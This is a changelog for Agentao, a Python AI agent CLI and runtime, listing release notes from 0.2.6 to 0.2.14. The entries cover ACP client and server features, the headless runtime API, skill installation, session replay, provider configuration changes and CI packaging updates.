- **Logging rotation**: `agentao.log` now uses
  `RotatingFileHandler(maxBytes=10_000_000, backupCount=5)` instead of
  a plain `FileHandler`, capping disk footprint at ~60 MB. The home-dir
  fallback (`~/.agentao/agentao.log`) gets the same rotation. Long-
  running sessions that previously grew the log into the hundreds of
  megabytes now self-cap.

### Fixed

- **VitePress docs at custom-domain root** (commit `875e526`): the
  developer-guide deploy now serves correctly at the `agentao.cn`
  custom-domain root rather than under a subpath.

### Packaging / CI

- `actions/upload-artifact` v4 → v7, `actions/download-artifact` v4 →
  v8, `actions/setup-python` v5 → v6 — clears the GitHub Node 24
  default cutover (2026-06-02). (`upload-artifact` has no v8 line yet;
  v7 is the current major.) `setup-uv` had already moved v6 → v7 in
  `0.2.14.dev0`.
- Version pins refreshed from `0.2.13` to `0.2.14` across `docs/guides/acp.md`
  and the developer-guide install / version-check examples.

## [0.2.13] — 2026-04-24

Promotes `0.2.13rc1` to general availability, plus one additive feature
(monorepo skill install) folded into the GA cut.

Headline: **runtime decomposition + session replay subsystem**, now with
**monorepo-aware `skill install`** layered on top. The substantive
Added / Changed breakdown — session replay (`agentao/replay/`), the
`agentao --help` / `-h` entry-point fix, and the four-module runtime
split (`runtime/`, `acp_client/manager/`, `cli/commands_ext/`, new
`prompts/` and `tooling/` packages) — is preserved below from the
`[0.2.13rc1]` soak entry.

The GA cut also carries a packaging + documentation pass: version string
aligned from `0.2.13rc1` → `0.2.13`, `docs/guides/acp.md` examples bumped,
Quick Start env var guidance synced with the strict provider-gating
behaviour shipped in `0.2.11`, the GitHub Pages workflow switched from
the legacy Jekyll template to the actual VitePress developer-guide
build, and lingering `0.2.10` / `0.2.11` install-pin examples in the
developer guide refreshed to the current line.

### Added

- **Monorepo skill install** (`agentao skill install owner/repo:path[@ref]`): extends the GitHub installer to pull a single skill out of a multi-skill repository — e.g. `agentao skill install anthropics/skills:pptx@main` installs only the `pptx/` subdirectory instead of rejecting the archive for missing a top-level `SKILL.md`. `SourceSpec.package_path` (`agentao/skills/sources.py`) carries the subpath; `GitHubSkillSource.resolve()` parses the `:path` segment and rejects empty / absolute / `.` / `..` components. `SkillInstaller._find_package_root()` (`agentao/skills/installer.py`) validates the subdirectory exists, is a directory, and contains `SKILL.md`; the recorded `source_ref` preserves the full `owner/repo:path@ref` string so `skill update` round-trips. CLI help on `skill install` now advertises the new form. Coverage: `tests/test_skill_installer.py` (+119 lines across success / empty-path / parent-dir-traversal / update paths), `tests/test_skill_cli.py`.
- **Session replay subsystem** (`agentao/replay/`): JSONL timeline of runtime events written to `.agentao/replays/`, with recorder, reader, redaction, retention, and sanitization. Wired through `transport/events.py` and surfaced via the new `cli/replay_commands.py` / `replay_render.py`. Feature docs: `docs/guides/session-replay.md`. Tests: `tests/test_replay*`, `tests/test_replay_redact.py`.
- **`agentao --help` / `agentao -h`**: explicit `-h` / `--help` handler on the top-level CLI parser. Prints usage and exits `0` instead of silently falling through to interactive mode (the previous `add_help=False` + `parse_known_args()` combination swallowed the flag). Regression coverage: `tests/test_acp_cli_entrypoint.py::TestEntrypointArgparse::test_help_flag_prints_help_and_exits` and `test_short_help_flag_prints_help_and_exits`.

### Changed

- **Runtime decomposition** — four monolithic modules split into focused packages; public `Agentao.chat()` / `tool_runner` contract preserved (`agentao/tool_runner.py` kept as a compat shim):
  - `agentao/runtime/` (new): `chat_loop`, `tool_runner`, `model`, `llm_call`, `turn` extracted from `agent.py` (~660 net lines removed from `agent.py`).
  - `agentao/acp_client/manager.py` (2938 lines) → `manager/` package (`connection`, `core`, `helpers`, `interactions`, `lifecycle`, `recovery`, `status`, `turns`).
  - `agentao/cli/commands_ext.py` (1688 lines) → `commands_ext/` package (`acp`, `agents`, `crystallize`, `memory`).
  - `agentao/cli/app.py` shrunk by ~800 lines; new CLI modules `input_loop`, `ui`, `acp_inbox`.
  - `agentao/prompts/` (new): `builder` + `sections` + `helpers` for system-prompt composition. `agent._build_system_prompt()` and `agent._load_project_instructions()` retained as thin facades so existing tests and external patches keep working.
  - `agentao/tooling/` (new): `registry`, `agent_tools`, `mcp_tools`.
- **Docs**: `docs/guides/acp.md` version examples bumped from `0.2.10` to `0.2.13`. Developer-guide `part-2/2-constructor-reference.md`, `part-5/5-memory.md`, `part-5/6-system-prompt.md` (en + zh mirrors) updated to reference the new `prompts/builder.py` location for system-prompt composition.

### Packaging / Release (GA)

- Align package version, changelog, release notes, and publish workflow usage to the final `0.2.13` release line.
- README / `docs/start/quickstart.md` Quick Start: document all three required provider variables (`OPENAI_API_KEY`, `OPENAI_BASE_URL`, `OPENAI_MODEL`) up front. Previously only `OPENAI_API_KEY` was shown, contradicting the strict-provider-gating behaviour introduced in `0.2.11` — the single-key snippet would raise `ValueError` at startup.
- `.github/workflows/jekyll-gh-pages.yml` replaced by a VitePress build + deploy pipeline pointed at `developer-guide/`. The Jekyll template was a repo-init leftover; the actual docs site is VitePress, so the previous workflow was deploying nothing useful.
- Developer-guide install-pin / version-check examples refreshed from `0.2.10` / `0.2.11` to `0.2.13` in `part-1/5-requirements.md`, `part-2/1-install-import.md`, `part-3/2-agentao-as-server.md` (JSON response example), and `part-3/5-zed-ide-integration.md` (en + zh mirrors). Historical statements ("Since v0.2.10…", "Pre-0.2.10 Agentao used…") are kept — they describe when a surface was introduced, not the current pin.

### Documentation

- Add `docs/releases/v0.2.13.md`.
- `docs/guides/skills.md` and `developer-guide/en|zh/part-5/2-skills.md` document the new monorepo `skill install` form with worked examples against `anthropics/skills` (pptx, docx, xlsx, pdf, doc-coauthoring).

---

## [0.2.12] — 2026-04-22

### Added

- **Headless runtime v1** (`docs/guides/headless-runtime.md`): operator-facing contract for `ACPManager` as a non-interactive embedding target — public entry points (`prompt_once`, `send_prompt`), single-active-turn concurrency pinned to `AcpErrorCode.SERVER_BUSY`, typed status snapshot. `send_prompt_nonblocking` family is classified **internal / unstable** and removed from the embedding contract.
- **`ServerStatus` dataclass** (`agentao/acp_client/models.py`, re-exported from `agentao.acp_client`): frozen v1 shape with `server`, `state`, `pid`, `has_active_turn`.
- **`examples/headless_worker.py`**: runnable headless smoke consumer. Spins up an inline mock ACP server, exercises success / non-interactive error / cancel paths, and prints the typed snapshot after each.
- **`tests/test_headless_runtime.py`**: baseline smoke tests pinning the Week 1 contract — typed snapshot shape, `has_active_turn` derivation, `SERVER_BUSY` on concurrent submit, cancel-then-continue, non-interactive reject non-pollution, timeout recovery, session reuse.
- **Headless runtime Week 2 diagnostics** (`docs/guides/headless-runtime.md` §3-§4, additive on `ServerStatus`): `active_session_id`, `last_error`, `last_error_at` (tz-aware UTC `datetime` assigned at *store time* inside the manager, not raise time), `inbox_pending`, `interaction_pending` (singular, replaces the pre-v1 `interactions_pending` alias), `config_warnings` (per-server list; Week 3 will populate on legacy config).
- **`ACPManager.readiness(name)` / `.is_ready(name)`**: typed 4-valued classifier (`"ready" | "busy" | "failed" | "not_ready"`) over the combination of handle state and the active-turn slot. Consumers that only need a gating signal should prefer this over string-matching on `state`.
- **`ACPManager.reset_last_error(name)`**: explicit clear for the sticky `last_error` / `last_error_at` surface. A new error overwrites automatically; this method is only needed when the host wants to drop the stored error without waiting for a new one.
- **State-vs-error contract**: the recorded-error surface is diagnostic, not gating — `state` is the authoritative readiness signal, `last_error` is history. `SERVER_BUSY` and `SERVER_NOT_FOUND` are intentionally excluded from the store so fail-fast retries do not overwrite real failures. Pinned by tests (`tests/test_headless_runtime.py::TestLastErrorStore`) including a `datetime`-patch proof that the timestamp is taken inside `_record_last_error`, not pre-computed.
- **`InteractionPolicy` dataclass** (Week 3, Issue 11) re-exported from `agentao.acp_client`. Minimal single-dimension policy model over the non-interactive interaction decision: `InteractionPolicy(mode="reject_all" | "accept_all")`. No other knobs — additional dimensions belong on a new options object.
- **`interaction_policy=` per-call override** on `ACPManager.send_prompt` and `ACPManager.prompt_once`. Accepts `InteractionPolicy` or the bare strings `"reject_all"` / `"accept_all"`. Precedence: per-call override > server default (`nonInteractivePolicy`). `None` falls back to the server default. `send_prompt_nonblocking` is **internal / unstable** per the Week 1 decision and deliberately does **not** accept this kwarg — the Week 3 policy surface is `send_prompt` + `prompt_once` only.
- **Headless runtime Week 4 lifecycle & recovery** (`docs/guides/headless-runtime.md` §7). Pins the deterministic release order on every failure path (pending-slot drop → turn-slot clear → lock release → `last_error` record) and introduces the client/process-death classifier.
- **`classify_process_death` pure classifier** exported from `agentao.acp_client`. Maps `(exit_code, signaled, during_active_turn, restart_count, max_recoverable_restarts, handshake_fail_streak)` to `"recoverable"` / `"fatal"` per the Issue 16 decision matrix. Testable in isolation; the manager calls it inside `ensure_connected` to decide whether to lazy-rebuild or flip the server into the sticky fatal state.
- **`ACPManager.is_fatal(name)` / `.restart_count(name)`** surfaces for the recovery state. `is_fatal(name)` is sticky — cleared only by an explicit `restart_server` or `start_server` call (operator action required).
- **`AcpServerConfig.max_recoverable_restarts`** (JSON: `maxRecoverableRestarts`, default 3). Caps consecutive auto-recoveries on recoverable idle non-zero exits before the manager flips the server to fatal. Active-turn deaths bypass the cap; each is always allowed at least one rebuild attempt.
- **Daemon-style regression suite** (`tests/test_headless_runtime.py::TestDaemonRegression`): long session reuse, reject-then-continue, cancel-then-continue, timeout-then-continue, and process-death recovery (both recoverable and fatal). Pinned against the mock ACP server from `test_acp_client_embedding` so the scenarios stay executable in CI.
- **`/crystallize` evidence + feedback loop**: `SkillEvidence` and `SkillFeedbackEntry` dataclasses (`agentao/skills/drafts.py`) extend `SkillDraft` with structured tool-activity grounding (`user_goals`, `assistant_conclusions`, `tool_calls`, `tool_results`, `key_files`, `workflow_steps`, `outcome_signals`), a `feedback_history` rewrite log, and `open_questions`. Drafts persist forward- and backward-compatible JSON — legacy payloads load with empty evidence/history.
- **`collect_crystallize_evidence` / `render_crystallize_context`** (`agentao/cli/commands_ext.py`): pull structured evidence from the live `AgentaoCLI` message history (tool calls + tool results, not just narrated text) and render it as the `# Structured evidence` block consumed by `/crystallize suggest|refine|feedback`.
- **`feedback_prompt` + `FEEDBACK_SYSTEM_PROMPT`** (`agentao/memory/crystallizer.py`): drive user-feedback-driven draft rewrites; `suggest_prompt()` and `refine_prompt()` gained an optional `evidence_text=` parameter so all three prompts share the same evidence grounding. Drafts grounded in tool activity, not just raw transcript.
- **`append_skill_feedback` + `summarize_draft_status`** (`agentao/skills/drafts.py`): durable feedback log and lightweight status view for `/crystallize status`.
- **`tests/test_skill_crystallize_enhancement.py`**: 15 tests covering the new dataclass schema, persistence round-trip, backward-compatible load of legacy drafts, prompt-builder evidence injection, and feedback append/history rendering.
- **Plan doc** `docs/history/implementation/skill-crystallize-enhancement-plan.md`: design rationale and API surface for the three-problem scope (structured evidence in drafts, user feedback loop, `/help` discoverability).

### Changed

- **Breaking: `ACPManager.get_status()` now returns `list[ServerStatus]`** instead of `list[dict]`. This is a deliberate, once-for-all API convergence — there is no `get_status_typed()` side channel and no permanent dict alias. Migration table and field semantics are in `docs/guides/headless-runtime.md#3-status-snapshot-v1--v2`.
  - The legacy `"name"` dict key is renamed to `ServerStatus.server`.
  - Week-1 core fields are `server` / `state` / `pid` / `has_active_turn`. Week 2 adds `active_session_id`, `last_error`, `last_error_at`, `inbox_pending`, `interaction_pending`, `config_warnings` **additively** — the Week 1 shape is unchanged.
  - `has_active_turn` is derived from the manager's active turn slot (not handle state), so it stays `True` across the in-flight interaction phase of non-interactive turns.
  - `last_error` is sticky across successful turns by design (so once-per-minute pollers still see the last-known failure); clear explicitly via `reset_last_error(name)` or wait for a new error to overwrite.
- CLI `/acp list` / session status readouts and the embedding developer-guide pages (part-1 mode 3, part-3 reverse-ACP, appendix A / D / F / G, zh + en mirrors) are migrated to the typed contract.
- **Breaking: `nonInteractivePolicy` bare-string config form is removed** (Week 3, Issue 12). `.agentao/acp.json` must now use the structured object form — `"nonInteractivePolicy": {"mode": "reject_all" | "accept_all"}`. The legacy strings `"reject_all"` / `"accept_all"` as a bare value raise `AcpConfigError` **at config-load time** (`AcpClientConfig.from_dict` / `load_acp_client_config`). There is no silent upgrade and no deferred runtime failure — a drifted config cannot slip through to `send_prompt` execution. Migration: see [developer-guide appendix E.7](./developer-guide/en/appendix/e-migration.md#e7-headless-runtime--noninteractivepolicy-shape-change-week-3) (and the zh mirror).
- `AcpServerConfig.non_interactive_policy` is now typed as `InteractionPolicy` (previously `str`). Downstream callers that read `server_cfg.non_interactive_policy` should read `.mode` instead.

---

## [0.2.11] — 2026-04-19

### Added

- **Multi-provider `web_search`**: `WebSearchTool` now reads `BOCHA_API_KEY` once at startup. When present, all web searches route through Bocha Search API (`POST https://api.bochaai.com/v1/web-search`, Bearer auth, structured JSON results). When absent, the tool falls back to DuckDuckGo — no configuration change required for existing users.

### Changed

- **Strict LLM provider gating** (breaking): `LLMClient.__init__` now raises `ValueError` at startup if any of `{PROVIDER}_API_KEY`, `{PROVIDER}_BASE_URL`, or `{PROVIDER}_MODEL` is absent and was not supplied via constructor args. Previously a missing model silently fell back to a hardcoded default. Migrate: add all three to `.env`.
- `/provider` listing now only shows providers that have all three of `{PROVIDER}_API_KEY`, `{PROVIDER}_BASE_URL`, and `{PROVIDER}_MODEL` set. Switching to an incomplete provider also errors with a clear message.
- Removed `_PROVIDER_DEFAULT_MODELS` internal dict from `LLMClient`.
- `gpt-5.4` added to context-manager tokenizer mapping (`o200k_base` encoding, same as `gpt-4o` family).
- Default model in all examples, templates, and documentation updated from `gpt-4o` → `gpt-5.4`.

### Migration

```bash
# Before (silently used default model fallback):
OPENAI_API_KEY=sk-...

# After (all three required):
OPENAI_API_KEY=sk-...
OPENAI_BASE_URL=https://api.openai.com/v1
OPENAI_MODEL=gpt-5.4        # or whichever model you target
```

## [0.2.10] — 2026-04-15

Promotes the `0.2.10` line to general availability.

The feature set — ACP embedding facade and `/crystallize refine` — is
the same as the `[0.2.10-rc2]` entry below; this GA release is the first
cut that actually ships the feature code. Both `v0.2.10-rc1` and
`v0.2.10-rc2` were tagged against commits that carried only the version
bump and release notes, so the rc tarballs on TestPyPI are effectively
empty. **Do not depend on `v0.2.10-rc1` or `v0.2.10-rc2`** — upgrade
directly from `0.2.9` to `0.2.10`.

### Packaging / Release

- Align package version, changelog, release notes, and publish workflow
  usage to the final `0.2.10` GA line
- Bundle the ACP embedding facade, `/crystallize refine`, skill draft
  helpers, and the associated tests/docs into the GA commit so the
  sdist/wheel actually contains the advertised feature set

### Documentation

- Add `docs/releases/v0.2.10.md`
- Update `docs/guides/acp.md` version examples from `0.2.9` to `0.2.10`

## [0.2.10-rc2] — 2026-04-15

Re-cut of `0.2.10-rc1`. `rc1` failed the CI tag-vs-package version
consistency check because the `v0.2.10-rc1` tag was pushed against a
commit where `agentao/__init__.py` still reported `0.2.9`. `rc2` carries
the identical feature set with the version string aligned to the tag.

> **Note:** Neither `rc1` nor `rc2` actually shipped the feature code
> described below — both tags pointed at docs-only commits. The feature
> set first ships in the GA `0.2.10` release above.

Prerelease focused on two initiatives: promoting `agentao.acp_client` as a
stable **embedding facade for non-interactive runtimes**, and adding an
explicit **`/crystallize refine` stage** to the skill-crystallization flow.

### Added

- **ACP embedding facade** (`agentao/acp_client/`): non-interactive
  `send_prompt(..., interactive=False)` plus a one-shot `prompt_once(...)`
  entry point for daemon/workflow runtimes. Ephemeral clients created by
  `prompt_once` are tracked separately from durable `_clients` and do not
  appear in `get_status()`.
- **Structured client-side error taxonomy** (`AcpErrorCode`, `AcpClientError`,
  `AcpRpcError`, `AcpInteractionRequiredError`): embedding callers can branch
  on failure category without string matching. `AcpRpcError` preserves the
  raw JSON-RPC numeric `rpc_code` alongside the structured classification.
- **`HANDSHAKE_FAIL` classification**: `initialize` / `session/new` failures
  are re-labelled on both the `connect_server()` path and the ephemeral
  `prompt_once()` path, including RPC errors, so embedders can distinguish
  startup failures from in-session RPC failures uniformly.
- **Per-call `cwd` and `mcp_servers` session reuse**: a mismatch on either
  field triggers a fresh session; otherwise sessions are reused per named
  server under a strict single-active-turn contract.
- **`/crystallize refine`** (`agentao/cli/commands_ext.py`,
  `agentao/skills/drafts.py`): three-stage workflow
  `suggest -> refine -> create`, where `refine` re-runs the draft through
  the bundled `skill-creator` guidance. `suggest` now persists drafts under
  `.agentao/skill-drafts/` so `refine`/`create` can pick them up across
  turns.
- **Skill draft helpers** (`agentao/skills/drafts.py`): `new_draft`,
  `save_skill_draft`, `load_skill_draft`, `clear_skill_draft` with
  session-scoped paths and graceful handling of missing or malformed state.

### Fixed

- **`stop_all()` closes ephemeral clients** — in-flight `prompt_once()`
  callers previously blocked until their request timeout when the manager
  was shut down mid-call; ephemeral slots now receive the synthetic
  transport-closed signal alongside durable clients.
- **`load_skill_draft()` tolerates non-object JSON** — a corrupted draft
  file containing `[]` or a bare string no longer crashes
  `/crystallize status|refine|create`; the helper now returns `None` for
  any non-dict payload.
- **`/crystallize suggest` degrades when the draft directory is not
  writable** — the generated `SKILL.md` is still displayed, the save
  failure is surfaced as a warning, and the user is pointed at
  `/crystallize create [name]` instead of aborting the command.

### Tests

- New `tests/test_acp_client_embedding.py` covering non-interactive
  `send_prompt`, `prompt_once`, session reuse, ephemeral lifecycle,
  cancellation precedence, and handshake error classification.
- New `tests/test_skill_drafts.py` covering draft persistence, session
  scoping, corrupt-file tolerance, and path selection.
- Updated `tests/test_acp_client_cli.py`, `tests/test_acp_client_jsonrpc.py`,
  `tests/test_crystallizer.py`, `tests/test_reliability_prompt.py` for the
  new surfaces.

### Documentation

- Add `docs/guides/acp-embedding.md` (embedding facade overview)
- Add `docs/history/implementation/acp-embedding-implementation-plan.md`
- Add `docs/history/implementation/skill-crystallize-refinement-plan.md`
- Add `docs/history/kanban-acp-embedded-client-issue.md` (design parent doc)
- Add `docs/releases/v0.2.10-rc2.md`

## [0.2.9] — 2026-04-11

Small GA follow-up to `0.2.8` with three independently useful fixes on top
of the ACP client subsystem and the default-model rollout.

### Added

- **Explicit `@server` routing for the ACP client** (`agentao/acp_client/router.py`,
  `agentao/cli/app.py::_try_acp_explicit_route`) — `@server-name <task>`,
  `server-name: <task>`, and `让 / 请 server-name <task>` forms route
  deterministically to the named ACP server from the main CLI input. Longest-first
  name matching handles overlapping names (`qa` vs `qa.bot`). High-confidence shapes
  (`@…`, `让 …`, `请 …`) consume the turn when config is unavailable so delegation
  intent never silently falls back to the main agent; ambiguous colon-prefix shapes
  fall through so `Note:` / `url:` prose is never hijacked. ACP config is re-stat'd
  by mtime each attempt, so new/renamed servers are picked up without a CLI restart.
- **`$VAR` / `${VAR}` expansion in `AcpServerConfig.env`** — API keys and tokens
  can live in `.env` or the shell environment instead of being pasted into
  `.agentao/acp.json`.

### Fixed

- **ACP stdio is now forced to UTF-8 with `errors="strict"` before the server starts**
  (`agentao/acp/__main__.py`). Non-UTF-8 default encodings silently corrupt the
  JSON-RPC stream; the entry point now reconfigures stdin/stdout/stderr, verifies the
  result, and exits with a diagnostic on stderr if the streams cannot be made safe.
- **Default-model messaging realigned with the runtime** across the init wizard,
  `.env.example`, `README.md`, and `README.zh.md`. `LLMClient._PROVIDER_DEFAULT_MODELS`
  is the canonical source; surfaces previously suggested `gpt-5.4` / `gemini-2.0-flash`
  / `claude-opus-4-6`, contradicting the actual defaults (`gpt-5.4`,
  `gemini-flash-latest`, `claude-sonnet-4-6`, `deepseek-chat`). Unknown-provider
  fallback in `LLMClient.__init__` also returns `gpt-5.4` now instead of `gpt-5.4`.

### Documentation

- Add `docs/releases/v0.2.9.md`
- Update `docs/guides/acp.md` version examples from `0.2.8` to `0.2.9`

## [0.2.8] — 2026-04-11

Promotes `0.2.8-rc1` to general availability.

The substantive Added / Changed / Tests breakdown for the ACP client and CLI
refactor remains in the `[0.2.8-rc1]` entry below. The final 0.2.8 release
locks down release-facing metadata and documentation so the package version,
Git tag, release notes, and maintainer workflow all agree on the GA path.

### Packaging / Release

- Align package version, changelog, release notes, and publish workflow usage
  to the final `0.2.8` release line
- Document a maintainer smoke path (`uv run python -m pytest tests/`,
  `uv build`, `uv run twine check dist/*`) that runs tests, builds
  sdist/wheel, and validates metadata
- Add `build` and `twine` to the dev dependency group so release checks can be
  reproduced from a local source checkout

### Documentation

- Update `.env.example`, quickstart guides, and README snippets to reflect the
  current default model line (`gpt-5.4` / `gpt-5.4` examples) instead of stale
  `gpt-4-turbo-preview` examples
- Add final release notes at `docs/releases/v0.2.8.md`
- Update `docs/guides/acp.md` version examples from `0.2.8-rc1` to `0.2.8`

## [0.2.8-rc1] — 2026-04-11

Headline: **ACP Client for project-local server management** — Agentao can
now act as an ACP client, connecting to and managing external ACP-compatible
agent processes configured per-project. The old monolithic CLI is refactored
into a modular `agentao/cli/` package for maintainability.

Release intent: **prerelease / TestPyPI path**. Use tag `v0.2.8-rc1` and a
GitHub pre-release so `.github/workflows/publish-testpypi.yml` runs instead
of the full PyPI publish workflow.

### Added

- **ACP client subsystem** (`agentao/acp_client/`, ~2 400 lines)
  - `ACPManager` — top-level façade: lazy init on first `/acp` command,
    config loading, server lifecycle orchestration
  - `ACPClient` — per-server JSON-RPC 2.0 client over stdio with NDJSON
    framing; handles `initialize` + `session/new` handshake, `session/prompt`,
    `session/cancel`, and notification dispatch
  - `ACPProcessHandle` — subprocess lifecycle (spawn, graceful shutdown,
    stderr ring buffer for diagnostics)
  - `Inbox` — bounded message queue with idle-point flush; messages from
    ACP servers stay separate from the main conversation context
  - `InteractionRegistry` — tracks pending permission and input requests
    from servers; supports `approve`, `reject`, and `reply` resolution
  - `AcpServerConfig` / `AcpClientConfig` models with validation
  - `load_acp_client_config()` — reads `.agentao/acp.json` (project-only;
    no global config)
  - Rich-based `render.py` for CLI output formatting
- **`/acp` CLI commands**: `list`, `start`, `stop`, `restart`, `send`,
  `cancel`, `status`, `logs`, `approve`, `reject`, `reply`
- **ACP extension method `_agentao.cn/ask_user`** — advertised in
  `initialize` response `extensions` array; enables ACP servers to request
  free-form text input from the user. `ACPTransport.ask_user()` implemented
  with full error handling (all failures resolve to a sentinel, never crash
  the turn)
- **`ACPTransport.on_max_iterations()`** — conservative default: stops the
  turn when max iterations reached (no interactive menu in ACP mode)
- **Domain-based permission rules for `web_fetch`** in `PermissionEngine`:
  - `_extract_domain()` — URL parsing with missing-scheme handling
  - `_domain_matches()` — supports leading-dot suffix matching
    (`.github.com` matches `github.com` and `api.github.com`) and exact
    matching (`r.jina.ai`)
  - Preset allowlist: `.github.com`, `.docs.python.org`, `.wikipedia.org`,
    `r.jina.ai`, `.pypi.org`, `.readthedocs.io` → auto-allow
  - Preset blocklist: `localhost`, `127.0.0.1`, `0.0.0.0`,
    `169.254.169.254`, `.internal`, `.local`, `::1` → auto-deny
  - Domain rules displayed in `/permissions` output
- **`docs/guides/acp-client.md`** — full configuration reference,
  lifecycle, interaction bridge protocol, diagnostics, and troubleshooting

### Changed

- **CLI refactored from monolith to package** — the old single-file CLI (3 246
  lines) replaced by `agentao/cli/` package (~3 800 lines across 12
  modules): `app.py`, `commands.py`, `commands_ext.py`, `entrypoints.py`,
  `session.py`, `subcommands.py`, `transport.py`, `_globals.py`, `_utils.py`
- `PermissionEngine.evaluate()` now checks `domain` rules before falling
  through to regex-based `args` matching
- `PermissionEngine.explain()` renders domain allowlist/blocklist in the
  rule detail output
- README.md / README.zh.md updated with ACP Client section

### Tests

- **7 new test files** (~2 300 lines): `test_acp_client_cli.py`,
  `test_acp_client_config.py`, `test_acp_client_inbox.py`,
  `test_acp_client_jsonrpc.py`, `test_acp_client_process.py`,
  `test_acp_client_prompt.py`, `test_acp_ask_user.py`
- Existing CLI tests updated for the `agentao.cli` → `agentao.cli.app`
  import path change

---

## [0.2.7] — 2026-04-09

Headline: **Agent Client Protocol (ACP)** — Agentao can now be driven as
a headless JSON-RPC agent runtime by ACP-compatible clients (e.g. Zed).
The entire ACP wire protocol, per-session working directory isolation,
session-scoped MCP injection, and multi-session lifecycle are new.

The retriever's CJK tokenization is upgraded from character bigrams to
jieba word segmentation, and the memory subsystem's startup resilience is
hardened so restricted / read-only environments no longer crash the
constructor.

### Added

- **ACP stdio JSON-RPC server** (`agentao/acp/`, ~3 500 lines)
  - Launch with `agentao --acp --stdio` or `python -m agentao --acp --stdio`
  - Methods: `initialize`, `session/new`, `session/prompt`,
    `session/cancel`, `session/load`
  - Server→client `session/request_permission` with `allow_once` /
    `allow_always` / `reject_once` / `reject_always` options
  - Stdout guard: `sys.stdout` redirected to stderr on ACP entry so
    stray `print()` anywhere in the process never corrupts the NDJSON
    wire; JSON-RPC responses use a captured handle to the real stdout
  - Capability advertisement: `text` + `resource_link` content blocks,
    stdio + sse MCP transport, no `fs.*`/`terminal.*` host proxying
  - `AcpServer`, `AcpSessionManager`, `AcpSessionState`, `ACPTransport`
    (maps Agentao transport events to ACP `session/update` notifications)
- **`python -m agentao` module entry point** (`agentao/__main__.py`) so
  the CLI works even when the console script is not on PATH
- **Per-session working directory isolation** (Issue 05)
  - `Agentao(working_directory=Path)` freezes memory, permissions, MCP
    config, AGENTAO.md loading, system-prompt rendering, file tools, and
    shell tool against that path
  - `Agentao.working_directory` property: `None` → lazy `Path.cwd()`
    (CLI compatibility); `Path` → frozen resolved path (ACP sessions)
  - `Tool._resolve_path()` / `_resolve_directory()` helpers on the base
    class; all file, search, and shell tools use them
  - `PermissionEngine(project_root=...)`, `load_mcp_config(project_root=...)`,
    `SkillManager(working_directory=...)`, `save_session(project_root=...)`,
    `load_session(project_root=...)`, `list_sessions(project_root=...)`,
    `delete_session(project_root=...)`, `delete_all_sessions(project_root=...)`
    all accept an explicit project root; `None` falls back to `Path.cwd()`
- **Session-scoped MCP server injection** (Issue 11)
  - `Agentao(extra_mcp_servers=...)` merges in-memory configs on top of
    file-loaded `.agentao/mcp.json` (name-level override, no disk writes)
  - ACP `session/new` `mcpServers` wire field → translated by
    `agentao.acp.mcp_translate.translate_acp_mcp_servers()`
- **LLM log file fallback** — `LLMClient._build_file_handler()` resolves
  `agentao.log` to an absolute path anchored to the working directory;
  when the target is unwritable (ACP launches with cwd `/` on macOS),
  falls back to `<home>/.agentao/agentao.log`
- **jieba word segmentation for CJK retrieval** — `MemoryRetriever` now
  segments Chinese/Japanese/Korean text with jieba instead of character
  bigrams. `"版本管理"` → `{"版本", "管理"}` (was `{"版本", "本管", "管理"}`).
  Single-character CJK tokens filtered out (matches the Latin `len > 1`
  rule). Custom dictionary: `<home>/.agentao/userdict.txt` (lazy-loaded on
  first recall). New dependency: `jieba>=0.42.1`
- **Inverted index in `MemoryRetriever`** — `write_version`-gated
  token → record-ID map so recall scores only records sharing at least
  one query token; avoids full-scan as memory store grows

### Changed

- `MemoryManager.__init__` widened exception handling from `OSError` to
  `(OSError, sqlite3.Error)` on both project-store and user-store init
  branches. The previous `OSError`-only catch missed
  `sqlite3.OperationalError: unable to open database file` raised when
  the directory exists but the DB cannot be opened/WAL-journaled,
  crashing `Agentao()` in restricted environments and killing every ACP
  session spawn. Each fallback now logs a `WARNING` (was silent)
- `_cjk_bigrams()` replaced by `_cjk_segment()` (jieba-backed); bigram
  noise eliminated from CJK recall scoring
- CLI `entrypoint()` extended: `--acp` and `--stdio` flags; `--acp`
  short-circuits to `run_acp_mode()` before any Rich/interactive setup;
  `--stdio` without `--acp` exits with error code 2
- `SkillManager` now resolves project-scoped skill dirs and config files
  from an explicit `working_directory` at construction time; two ACP
  sessions in different repos see independent skill sets and
  disabled-skill state

### Fixed

- **`Agentao()` crash in restricted / non-writable environments** —
  `sqlite3.OperationalError` from the user-scope memory DB now triggers
  the fallback path (user store disabled, project store in-memory) instead
  of propagating as an unhandled exception. Root cause of ACP subprocess
  smoke-test failures and plain `Agentao(api_key='x')` startup failure
  when `<home>/.agentao/memory.db` is unwritable

### Tests

- **336 new ACP tests** across `test_acp_initialize.py`,
  `test_acp_session_new.py`, `test_acp_session_prompt.py`,
  `test_acp_session_cancel.py`, `test_acp_session_load.py`,
  `test_acp_session_manager.py`, `test_acp_protocol.py`,
  `test_acp_mcp_injection.py`, `test_acp_multi_session.py`,
  `test_acp_request_permission.py`, `test_acp_transport.py`,
  `test_acp_cli_entrypoint.py`
- **Per-session cwd isolation tests** in `test_per_session_cwd.py`:
  tool path resolution, memory DB binding, skill isolation, LLM log
  anchoring, ACP factory wiring, and two sqlite-fault-injection
  regressions for the restricted-env crash
- **Memory init fallback regressions** in `test_memory_manager.py`:
  `test_project_store_sqlite_error_falls_back_to_memory`,
  `test_user_store_sqlite_error_leaves_user_store_none`
- Suite total: **1035 tests** (1034 passing, 1 skipped), up from 657

## [0.2.6] — 2026-04-09

Promotes 0.2.6-rc1 to general availability. The substantive Added /
Changed / Removed / Fixed / Tests breakdown of the memory subsystem rewrite
lives in the `[0.2.6-rc1]` entry below — that is the content of this
release. The only commits between rc1 and final are CI-only workflow
hardening so the publish pipeline actually succeeds.

### Packaging / CI

- Bump `actions/checkout@v4` → `@v5` and `astral-sh/setup-uv@v5` → `@v6`
  so CI workflows run on the Node.js 24 runner. GitHub deprecated
  Node.js 20 actions on 2025-09-19; bumping to the next major of each
  clears the deprecation warning on every run
- Drop the invalid `--repository` flag from `twine check` in
  `publish-testpypi.yml`. `--repository` is valid for `twine upload` but
  not `twine check`, which only validates dist metadata locally — the
  flag was causing the TestPyPI workflow to exit with code 2 on every
  RC attempt
- Activate the venv with `source .publish-venv/bin/activate` (and
  `.publish-testpypi-venv`) before the publish smoke step instead of
  invoking `.venv/bin/python` directly. Direct-invoke does not put the
  venv's `bin/` on `PATH`, so `shutil.which('agentao')` returned `None`
  and failed the smoke test even though the entry-point script was
  installed correctly. Applied to both `publish.yml` and
  `publish-testpypi.yml`

### Notes

**No library-code changes between 0.2.6-rc1 and 0.2.6.** Memory
subsystem, prompt injection, crystallization pipeline, retriever
